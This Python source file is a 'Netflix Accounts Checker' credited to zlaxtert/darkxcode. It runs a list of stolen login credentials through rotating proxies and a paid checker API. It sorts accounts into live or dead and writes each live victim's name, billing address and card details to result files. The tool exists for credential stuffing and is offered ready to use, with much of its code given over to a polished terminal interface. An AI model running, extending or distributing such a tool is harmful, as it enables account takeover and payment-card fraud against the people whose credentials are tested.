# UPDATE   : 14 NOV 2026
# SCRIPT   : NETFLIX ACCOUNTS CHECKER
# VERSION  : 2.0
# TELEGRAM : https://t.me/zlaxtert
# CODE BY  : ZLAXTERT
# GITHUB   : https://github.com/zlaxtert-code
# NOTE     : PLEASE DONT CHANGE THIS

import os
import sys
import re
import time
import json
import random
import threading
import configparser
from multiprocessing.dummy import Pool as ThreadPool

import requests
from colorama import init, Fore, Back, Style
from urllib3.exceptions import InsecureRequestWarning

init(autoreset=True)
# Windows cmd defaults to cp437/cp1252, which can't encode ▸ │ ✔ — write UTF-8 to the console instead
for _s in (sys.stdout, sys.stderr):
    if hasattr(_s, 'reconfigure'):
        _s.reconfigure(encoding='utf-8', errors='replace')
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ─────────────────────────────── layout ───────────────────────────────
W = 50
GUTTER = 3
_last_mode = None
_h = 0                       # lines the last frame occupies — the live panel rewinds by this
_t0 = time.time()
RE_ANSI = re.compile(r'\x1b\[[0-9;?]*[a-zA-Z]')

def vlen(s):
    """visible width — len() is useless on colored rows"""
    return len(RE_ANSI.sub('', s))

def term_w():
    try:
        return os.get_terminal_size().columns
    except OSError:
        return 80

def mode():
    """wide = draw panels, narrow = headless (one progress line, no frames)."""
    if not sys.stdout.isatty():
        return 'narrow'
    return 'wide' if term_w() >= W + GUTTER * 2 else 'narrow'

def paint(s, up=0):
    """up=N rewinds N lines first, so the panel redraws in place instead of scrolling."""
    global _last_mode, _h
    m = mode()
    if m != _last_mode:  # the 8-char cursor-hide sequence keeps column position stable between modes
        if m == 'wide':
            sys.stdout.write(Style.RESET_ALL + '\x1b[?25l')
        _last_mode = m
    if not s.endswith('\n'):
        s += '\n'
    lines = s.split('\n')[:-1]          # trailing '' is the cursor's landing row, not a drawn line
    if m == 'wide':                     # piped output must stay free of control codes
        out = '\n'.join(((' ' * GUTTER + ln) if ln else '') + '\x1b[K' for ln in lines) + '\n'
    else:
        out = '\n'.join((' ' * GUTTER + ln) if ln else '' for ln in lines) + '\n'
    sys.stdout.write((f'\x1b[{up}A' if up and m == 'wide' else '') + out)
    sys.stdout.flush()
    _h = len(lines)

def color(hexcode):
    r, g, b = int(hexcode[0:2], 16), int(hexcode[2:4], 16), int(hexcode[4:6], 16)
    return f'\x1b[38;2;{r};{g};{b}m'

R_ = Style.RESET_ALL + Fore.RESET + Back.RESET
DIM = '\x1b[38;2;96;96;108m'      # ash
ASH = '\x1b[38;2;140;140;150m'    # bone
INK = '\x1b[38;2;205;205;212m'    # light ink
WH = Fore.WHITE
CY = color('00E5FF')              # cyan ice
MG = color('FF3E6C')              # netflix red
YL = color('FFD166')              # gold
GR = color('3DDC97')              # trusted green
SPIN = '⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏'

def lerp(a, b, f):
    return ''.join(f'{round(int(a[i:i + 2], 16) + (int(b[i:i + 2], 16) - int(a[i:i + 2], 16)) * f):02x}' for i in (0, 2, 4))

def gradient(text):
    return ''.join(
        f'{color(lerp("00E5FF", "FF3E6C", i / max(len(text) - 1, 1)))}{ch}'
        for i, ch in enumerate(text)
    ) + R_

def cut(s, n):
    s = str(s)
    return s if len(s) <= n else s[:max(n - 1, 0)] + '…'

logo = (
    '███    ██ ███████ █████ ██████ ██     ███ ██   ██',
    '████   ██ ██        █   ██     ██      █   ██ ██ ',
    '██ ██  ██ █████     █   █████  ██      █    ███  ',
    '██  ██ ██ ██        █   ██     ██      █   ██ ██ ',
    '██   ████ ███████   █   ██     ██████ ███ ██   ██',
)

def _grad_row(ln):
    return ''.join(color(lerp('00E5FF', 'FF3E6C', x / max(len(ln) - 1, 1))) + ch
                   for x, ch in enumerate(ln)) + R_

def logo_frame(sweep):
    """logo with a one-row white scanline sweeping down it — pure motion, no fake data"""
    rows = [f'{WH}{ln}{R_}' if y == sweep else _grad_row(ln) for y, ln in enumerate(logo)]
    return '\n' + '\n'.join(rows) + '\n'

def typeout(text, delay=0.006):
    """decrypt-style reveal: the line grows char by char in place"""
    paint(text + '\n')
    for i in range(1, len(text) + 1):
        paint(text[:i] + '\n', up=1)
        time.sleep(delay)

def boot(api, tproxy):
    if mode() != 'wide':
        paint(f'\n{MG}   N E T F L I X{R_}  {DIM}▸{R_} {ASH}account checker v2.0{R_}\n\n')
        return
    for k in range(len(logo) + 1):
        paint(logo_frame(k), up=_h)
        time.sleep(0.055)
    paint(f'\n{ASH}   A C C O U N T   C H E C K E R{R_}           {DIM}v2.0 · {R_}')
    paint(f'{ASH}{DIM}   by https://t.me/zlaxtert{R_}\n')
    paint(f'{DIM}{"─" * W}{R_}\n')
    for label, value in (('api', api), ('carrier', f'{tproxy} proxy'), ('engine', 'thread pool')):
        typeout(f'   {GR}✔ {R_} {ASH}{label:<9}{R_} {DIM}{value}{R_}')
    paint('\n')


def load_settings():
    cfg = configparser.ConfigParser()
    try:
        cfg.read('settings.ini')
        return cfg['SETTINGS']['APIKEY'], cfg['SETTINGS']['API'], cfg['SETTINGS']['TYPE_PROXY']
    except Exception:
        cfg['SETTINGS'] = {'APIKEY': 'PASTE YOUR APIKEY HERE',
                           'API': 'PASTE YOUR API HERE',
                           'TYPE_PROXY': 'PASTE YOUR TYPE PROXY HERE'}
        with open('settings.ini', 'a') as f:
            cfg.write(f)
        return cfg['SETTINGS']['APIKEY'], cfg['SETTINGS']['API'], cfg['SETTINGS']['TYPE_PROXY']

def require(key, api):
    for name, val in (('APIkey', key), ('API', api)):
        if val.startswith('PASTE YOUR'):
            paint(f'\n{Back.RED}{Fore.WHITE}  ✖  {R_} {MG}Incorrect {name}{R_}\n')
            sys.exit(1)

def ask(prompt, hint, default=None):
    while True:
        try:
            sys.stdout.write(f'{ASH}   │{R_} {INK}{prompt}{R_}  {DIM}{hint}{R_}\n'
                             f'{ASH}   └─{CY}▶{R_} ')
            sys.stdout.flush()
            v = input().strip()
            return v or default
        except (EOFError, KeyboardInterrupt):
            sys.exit(0)

def banner_slim():
    paint(f'\n{DIM}{"═" * W}{R_}\n'
          f'   {ASH}N E T F L I X{R_}  {DIM}::{R_}  {WH}ACCOUNT CHECKER{R_} BY ZLAXTERT {DIM}v2.0{R_}\n'
          f'{DIM}{"═" * W}{R_}')

_lock = threading.Lock()

def write(path, line):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    with open(path, 'a', encoding='utf-8') as f:
        f.write(line + '\n')

def _bar(pct, size):
    n = int(size * pct / 100)
    return '█' * n + '░' * (size - n)

def _mmss(sec):
    return f'{int(sec) // 60:02d}:{int(sec) % 60:02d}'

EVENT = {'LIVE': (GR, '✚ ', 'LIVE'), 'DIE': (MG, '✖ ', 'DEAD'), 'RETRY': (YL, '↻ ', 'RETRY')}

def ui(stats, threads, ev=None):
    """One fixed-size frame: counters, progress rail, last event, ticker. Never taller or shorter."""
    s = stats
    inner = W - 2

    def row(c):
        return f'{CY}│{R_}{c}{" " * max(inner - vlen(c), 0)}{CY}│{R_}'

    def sep(left, right):
        return f'{CY}{left}{"─" * inner}{right}{R_}'

    def cell(label, value, lc, vc):
        v = str(value)
        return f' {lc}{label}{R_}{" " * max(17 - len(label) - len(v), 0)}{vc}{v}{R_}'

    spin = SPIN[int(time.time() * 10) % len(SPIN)]
    left = f' {INK}SECURE CHANNEL{R_}'
    right = f'{DIM}{threads} THREAD{"S" if threads != 1 else ""}{R_} {CY}{spin}{R_}'

    body = [
        sep('┌', '┐'),
        row(left + ' ' * max(inner - vlen(left) - vlen(right), 0) + right),
        sep('├', '┤'),
        row(cell('target', s['total'], DIM, INK) + cell('live', s['live'], DIM, GR) + cell('dead', s['dead'], DIM, MG)),
        row(cell('scanned', s['checked'], DIM, ASH) + cell('retry', s['retries'], DIM, YL)
            + cell('hit', f'{s["live"] * 100 // max(s["checked"], 1)}%', DIM, INK)),
        sep('├', '┤'),
        row(f' {gradient(_bar(s["pct"], 38))} {INK}{s["pct"]:3d}%{R_}'),
        sep('├', '┤'),
    ]
    if ev:
        tag, cred, msg = ev
        c, glyph, label = EVENT.get(tag, EVENT['RETRY'])
        body += [row(f' {c}{glyph}{R_} {c}{label:<5}{R_} {ASH}{cut(cred, inner - 12)}{R_}'),
                 row(f'   {DIM}{cut(msg, inner - 4)}{R_}')]
    else:
        body += [row(f' {DIM}standing by · waiting for first result{R_}'), row('')]
    elapsed = max(time.time() - _t0, 0.001)
    body += [
        sep('├', '┤'),
        row(f' {DIM}↻{R_} {ASH}{s["checked"]}/{s["total"]}{R_} {DIM}·{R_} '
            f'{ASH}{s["checked"] / elapsed:.1f}/s{R_} {DIM}·{R_} {ASH}{_mmss(elapsed)}{R_}'),
        sep('└', '┘'),
    ]
    return '\n'.join(body)

def render(stats, threads, cred, tag, msg, line):
    
    with _lock:
        stats['checked'] += 1
        stats['pct'] = min(int(stats['checked'] * 100 / max(stats['total'], 1)), 100)
        if mode() == 'narrow':
            if line % 7 == 0 or tag in ('LIVE', 'DIE'):
                s = stats
                paint(f'{ASH}{s["pct"]:3d}%{R_} {GR}L{s["live"]}{R_} '
                      f'{MG}D{s["dead"]}{R_} {YL}×{s["checked"]}{R_}\n')
            return
        paint(ui(stats, threads, (tag, cred, msg)) + '\n', up=_h)

def pick_proxy():
    with open('proxy.txt') as f:
        lines = [l.strip() for l in f.read().replace('\r', '').split('\n') if l.strip()]
    if not lines:
        raise RuntimeError('proxy.txt is empty')
    p = random.choice(lines).replace('https://', '').replace('http://', '').replace('/', '')
    if '@' in p:  
        auth, host = p.split('@')
        return auth, host
    return '', p

def kind_of(text):
    if 'Incorrect APIkey!' in text or 'Apikey has been blocked!' in text:
        return 'FATAL'
    if 'SUCCESS LOGIN!' in text or '"status":"success"' in text:
        return 'LIVE'
    if 'INVALID COOKIES' in text or 'Proxy is dead or proxy type is wrong!' in text:
        return 'RETRY'
    if '"status":"failed"' in text or '"status":"die"' in text:
        return 'DIE'
    return 'UNKNOWN'

def wallet(acc):
    pay = acc.get('type_payment', '')
    return f'{acc.get("type_cards")}|{acc.get("cards")}' if pay == 'CARD' else str(pay)

def compose(acc, cred, stamped):
    return '|'.join([stamped, cred, str(acc.get('fullname')), str(acc.get('type_accounts')),
                     str(acc.get('billing_address')), str(acc.get('billing_city')),
                     str(acc.get('billing_state')), str(acc.get('billing_postcode')),
                     str(acc.get('billing_country')), str(acc.get('billing_countrycode')).upper(),
                     wallet(acc), 'NETFLIX CHECKER', './ BY DARKXCODE V2.0'])

class NetflixChecker:
    def __init__(self, api, key, tproxy, stats, threads):
        self.api, self.key, self.tproxy = api, key, tproxy
        self.stats, self.threads = stats, threads
        self._line = 0

    def _make_call(self, cred):
        
        try:
            auth, host = pick_proxy()
        except Exception as e:
            return 'DIE', f'proxy: {e}', None
        url = (f'{self.api}/checker/netflix-checker/?lists={cred.strip()}'
               f'&proxy={host}&proxyAuth={auth}&type_proxy={self.tproxy}&apikey={self.key}')
        try:
            r = requests.get(url, timeout=15)
        except Exception as e:
            return 'RETRY', f'{e}', None
        if r.status_code != 200:
            return 'ERROR', 'RESPONSE CODE NOT 200', r.text
        try:
            js = json.loads(r.text)
            msg = js['data']['info']['msg']
        except Exception:
            return 'UNKNOWN', 'malformed payload', r.text
        k = kind_of(r.text)
        if k == 'LIVE':
            acc = js['data']['info']['accounts']
            msg = ' · '.join(str(x) for x in (acc.get('fullname'), acc.get('type_accounts'), wallet(acc)) if x)
            self.stats['live'] += 1
            with _lock:
                write('result/live.txt', cred.strip())
                write('result/success_log_info.txt', compose(acc, cred.strip(), time.asctime()))
        elif k == 'DIE':
            self.stats['dead'] += 1
            with _lock:
                write('result/dead.txt', cred.strip())
        elif k == 'RETRY':
            self.stats['retries'] += 1
        elif k == 'FATAL':
            paint(f'\n{Back.RED}{Fore.WHITE}  ✖  {R_} {MG}Incorrect APIkey! or Apikey has been blocked!{R_}\n')
            os._exit(1)
        else:
            self.stats['retries'] += 1
            write('result/unknown.txt', cred.strip())
            msg = f'unknown response: {r.text[:40]}'
        return k, msg, None

    def check(self, cred):
        with _lock:
            self._line += 1
            line = self._line
        # shortcut: bounded retry, max 3 attempts per credential, so a dead proxy can't spin forever
        tag, msg, dump = 'RETRY', '', None
        for _ in range(3):
            tag, msg, dump = self._make_call(cred)
            if tag != 'RETRY':
                break
        render(self.stats, self.threads, cred.strip(), tag if tag in ('LIVE', 'DIE') else 'RETRY', msg, line)
        if tag in ('ERROR', 'UNKNOWN'):
            write('result/response.txt', dump or '')
        return tag

apikey_darkxcode, APIs_darkxcode, TYPE_PROXY = load_settings()
os.system('cls' if os.name == 'nt' else 'clear')
require(apikey_darkxcode, APIs_darkxcode)
boot(APIs_darkxcode, TYPE_PROXY)

lists = ''
while not os.path.isfile(lists):
    lists = ask('Input list file', '(example: list.txt)', 'list.txt')
ListPass = [l for l in open(lists, encoding='utf-8').read().split('\n') if l.strip()]
if not ListPass:
    paint(f'\n{MG}   ✖ list is empty{R_}\n')
    sys.exit(1)

threads = 0
while not 2 <= threads <= 10:
    raw = ask('Threads', '(2 - 10 | recommended 3-5)', '3')
    if not raw.isdigit():
        paint(f'{MG}   ✖ numbers only{R_}')
        continue
    threads = int(raw)
    if threads < 2:
        paint(f'{MG}   ✖ MIN THREADS 2{R_}')
    elif threads > 10:
        paint(f'{MG}   ✖ MAX THREADS 10{R_}')
os.system('cls' if os.name == 'nt' else 'clear')
banner_slim()

stats = {'checked': 0, 'retries': 0, 'live': 0, 'dead': 0, 'total': len(ListPass), 'pct': 0}
if mode() == 'wide':
    paint(f'{ui(stats, threads)}\n\n')
else:
    paint(f'\n   THREADS {threads}  ·  {len(ListPass)} ACCOUNT\n')

started = _t0 = time.time()
pool = ThreadPool(threads)
tags = pool.map(NetflixChecker(APIs_darkxcode, apikey_darkxcode, TYPE_PROXY, stats, threads).check, ListPass)
pool.close()
pool.join()
elapsed = time.time() - started
hit = stats['live'] * 100 // max(stats['total'], 1)

if mode() == 'wide':
    rows = ''.join(f'   {c}◈ {k:<10}{R_}{INK}{stats[k]}{R_}\n'
                   for k, c in (('live', GR), ('dead', MG), ('retries', YL)))
    paint(f'\n{DIM}{"─" * W}{R_}\n{DIM}   ›  SUMMARY{R_}\n{DIM}{"─" * W}{R_}\n'
          f'{rows}'
          f'   {DIM}◈ hit rate    {R_}{INK}{hit}%{R_}\n'
          f'   {DIM}◈ elapsed     {R_}{INK}{_mmss(elapsed)}{R_}\n'
          f'{DIM}{"─" * W}{R_}\n'
          f'   {GR}▸ LIVE{R_}{DIM}   → result/live.txt · result/success_log_info.txt{R_}\n'
          f'   {MG}▸ DEAD{R_}{DIM}   → result/dead.txt{R_}\n'
          f'   {DIM}▸ RAW{R_}{DIM}    → result/unknown.txt{R_}\n'
          f'{DIM}{"─" * W}{R_}\n'
          f'   {gradient("checking complete")}  {DIM}[ by zlaxtert ]{R_}\n\n')
else:
    paint(f'\n   DONE {int(elapsed)}s · LIVE {stats["live"]} · DEAD {stats["dead"]} · RETRY {stats["retries"]}\n')

if mode() == 'wide':
    sys.stdout.write(Style.RESET_ALL + '\x1b[?25h')
